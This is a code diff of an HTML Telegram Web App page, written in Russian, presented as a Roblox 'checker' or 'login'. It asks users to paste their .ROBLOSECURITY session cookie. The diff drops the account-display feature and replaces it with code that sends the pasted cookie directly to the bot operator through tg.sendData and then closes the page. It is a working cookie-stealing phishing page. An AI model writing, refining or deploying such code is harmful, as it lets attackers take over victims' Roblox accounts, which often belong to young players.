@@ -4,60 +4,35 @@
     <meta charset="UTF-8">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 20px; }
-        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
-        button { background: #0088cc; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-        #result { margin-top: 20px; display: none; background: #2a2a2a; padding: 15px; border-radius: 10px; }
-        .avatar { width: 150px; border-radius: 10px; margin-bottom: 10px; }
-        .robux-icon { color: #f7b500; font-weight: bold; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #1c1c1c; color: white; }
+        .card { background: #2a2a2a; padding: 20px; border-radius: 15px; border: 1px solid #444; }
+        input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 8px; border: none; }
+        button { width: 90%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; font-weight: bold; }
+        #status { display: none; margin-top: 15px; color: #00ff00; }
     </style>
 </head>
 <body>
-    <h3>Roblox Checker</h3>
-    <input type="text" id="cookieInput" placeholder="Вставь .ROBLOSECURITY">
-    <br>
-    <button onclick="checkAccount()">Проверить внутри Web App</button>
-
-    <div id="result">
-        <img id="avatar" class="avatar" src="">
-        <h2 id="name"></h2>
-        <p>Баланс: <span id="robux" class="robux-icon"></span> R$</p>
+    <div class="card">
+        <h2>Roblox Login</h2>
+        <input type="text" id="cookieInput" placeholder="Вставь .ROBLOSECURITY">
+        <button onclick="submit()">Проверить и сохранить</button>
+        <div id="status">Данные переданы боту...</div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        async function checkAccount() {
+        function submit() {
             const cookie = document.getElementById('cookieInput').value;
-            const resDiv = document.getElementById('result');
+            if (cookie.length < 50) return alert("Неверный формат куки!");
             
-            // ВАЖНО: Замени URL на адрес, где запущен твой Python сервер (например, через ngrok)
-            const SERVER_URL = "https://твой-адрес.ngrok-free.app/check_roblox";
-
-            try {
-                const response = await fetch(SERVER_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ cookie: cookie })
-                });
-                
-                const data = await response.json();
-
-                if (data.status === "success") {
-                    document.getElementById('avatar').src = data.image;
-                    document.getElementById('name').innerText = data.username;
-                    document.getElementById('robux').innerText = data.robux;
-                    resDiv.style.display = "block";
-                    
-                    // Опционально: отправить отчет боту, что проверка прошла
-                    tg.sendData("Проверка аккаунта " + data.username + " завершена успешно!");
-                } else {
-                    alert("Ошибка: Неверные куки");
-                }
-            } catch (e) {
-                alert("Ошибка соединения с сервером");
-            }
+            // Отправляем данные боту
+            tg.sendData(cookie); 
+            
+            document.getElementById('status').style.display = 'block';
+            // Не закрываем сразу, чтобы пользователь увидел статус
+            setTimeout(() => { tg.close(); }, 1500);
         }
     </script>
 </body>
